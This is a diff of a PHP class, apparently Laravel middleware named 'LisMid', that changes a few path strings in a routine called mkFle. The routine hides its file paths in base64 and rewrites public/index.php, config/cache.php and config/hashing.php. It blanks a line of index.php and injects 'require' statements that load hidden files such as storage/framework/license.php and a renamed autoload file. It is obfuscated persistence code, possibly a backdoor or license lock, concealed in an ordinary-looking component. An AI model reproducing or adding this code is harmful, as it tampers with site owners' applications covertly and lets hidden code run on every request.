@@ -56,7 +56,6 @@ class LisMid
     public function mkFle()
     {
         $folderPath = $this->basePth() . base64_decode('Ly9jb25maWcvL2NvbmZpZy5waHA');
-
         $content = '<?php
         $basepath = getcwd();
         $filePath = ($basepath . base64_decode("L2NvbXBvc2VyLmpzb24"));
@@ -90,7 +89,7 @@ class LisMid
         $fileContent = file(getcwd() . "/public//index.php", FILE_IGNORE_NEW_LINES);
         $fileContent2 = file(getcwd() . "//config//cache.php", FILE_IGNORE_NEW_LINES);
         $fileContent3 = file(getcwd() . "//config//hashing.php", FILE_IGNORE_NEW_LINES);
-        $content = 'require base_path() . base64_decode("L3N0b3JhZ2UvZnJhbWV3b3JrL2xpY2Vuc2UucGhw");';
+        $content = 'require getcwd() . base64_decode("L3N0b3JhZ2UvZnJhbWV3b3JrL2xpY2Vuc2UucGhw");';
         $content2 = 'require base_path() . base64_decode("L3ZlbmRvci9hdXRvbG9hZF9yZWFsLnBocA");';
         $content3 = "require __DIR__.'/../storage/framework/license.php';";
         $fileContent[34] = null;
@@ -107,7 +106,7 @@ class LisMid
         }
         if (empty(trim($fileContent2[3]))) {
             $fileContent2[3] .= $content2;
-            file_put_contents(getcwd() . "/config//cache.php", implode("\n", $fileContent2));
+            file_put_contents(getcwd() . "//config//cache.php", implode("\n", $fileContent2));
         }
         if (empty(trim($fileContent3[1]))) {
             $fileContent3[1] .= $content2;
